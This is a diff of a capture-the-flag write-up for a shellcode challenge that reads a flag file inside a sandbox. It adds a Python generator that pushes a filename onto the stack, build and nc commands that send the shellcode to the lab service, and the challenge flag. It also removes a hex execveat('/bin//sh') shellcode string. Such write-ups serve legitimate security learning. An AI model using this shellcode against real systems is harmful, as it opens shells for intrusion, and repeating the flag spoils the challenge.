@@ -1,6 +1,6 @@
 # Description
 ```
-
+Mommy! I think I know how to make shellcode
 ```
 ---
 `~/readme`:
@@ -63,7 +63,7 @@ int main(int argc, char* argv[]){
 }
 ```
 ### Findings
-- X64 shellcode - executed in C
+- x64 shellcode (`sh` is executable)
 - chroot to `/home/asm_pwn` - I hope that means we could read the flag directly with `read({flag name})`
 - memory
 	- 1000 bytes of input
@@ -104,21 +104,34 @@ Which is their way to not make us know whats held in most registers, except:
 
 
 Based on the instructions, we would just need to write a shellcode to open the file, read to a buffer and finally write it to `stdout`.
+I tried creating a `poc` of that on my computer which worked fine, with a short filename. Then I moved to trying to read the flag filename, and generated this python script to create instructions for putting the filename on the stack.
 
-I wrote this `C-PP` syntax:
-```CPP
+I used Cyberchef to convert my filename to hex: [Recipe](https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)Swap_endianness('Hex',4,false/breakpoint)Remove_whitespace(true,true,true,true,true,false)).
+And later I found out that I can't just use `mov` once for 231 bytes, so I used the following script that splits the `mov` between many instructions:
+```python
+filename_hex = "..."
+b = bytes.fromhex(filename_hex)
 
+chunks = [b[i:i+8] for i in range(0, len(b), 8)]
+
+print("push 0x0")
+for c in reversed(chunks):
+    imm = int.from_bytes(c, "little")
+    print(f"mov rbx, 0x{imm:016x}")
+    print("push rbx")
+print("mov rdi, rsp")
 ```
+But later I was testing against a C program I wrote on my own which made me input the hex shellcode as an escaped string, which should have helped me, but it took me more than an hour to realize I was using wrong recipes on Cyberchef... 
 
-
-x86_64 execveat("/bin//sh") 29 bytes shellcode
-```C
-'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
+After  correcting that I finally got the flag (using the attached `asm.S` I wrote):
+```shell
+gcc -c -x assembler-with-cpp -nostdlib -o asm.o asm.S
+objcopy -O binary -j .text asm.o asm.bin
+cat asm.bin | nc 0 9026
 ```
-
 
 # Flag 
 ```
-
+Mak1ng_5helLcodE_i5_veRy_eaSy
 ```
 
